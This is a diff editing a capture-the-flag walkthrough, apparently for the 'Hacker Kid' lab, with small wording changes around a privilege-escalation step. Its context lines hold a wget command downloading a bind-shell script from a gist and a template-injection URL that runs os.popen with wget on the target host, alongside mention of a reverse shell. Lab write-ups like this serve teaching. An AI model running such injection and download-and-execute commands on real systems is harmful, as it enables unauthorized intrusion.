@@ -418,7 +418,8 @@ root         945       1  0 07:37 ?        00:00:01 /usr/sbin/apache2 -k start
 
 According to the article we need to spin up a BIND shell. so lets go look one up..
 
-On kali lets get that a BIND shell.
+On kali lets get that BIND shell downloaded and ready to add to our target.
+
 ```
 wget https://gist.githubusercontent.com/wifisecguy/1d69839fe855c36a1dbecca66948ad56/raw/e919439010bbabed769d86303ff18ffbacdaecfd/inject.py -O exploit.py
 ```
@@ -430,7 +431,7 @@ http://hackerkid.blackhat.local:9999/?name={%import%20os%}{{os.popen(%22wget%20h
 ```
 {% endraw %}
 
-And now back into our shell and lets run that python file.
+And now we jump back into our reverse shell and lets run that python exploit file.
 
 ```
 saket@ubuntu:/tmp$ which python
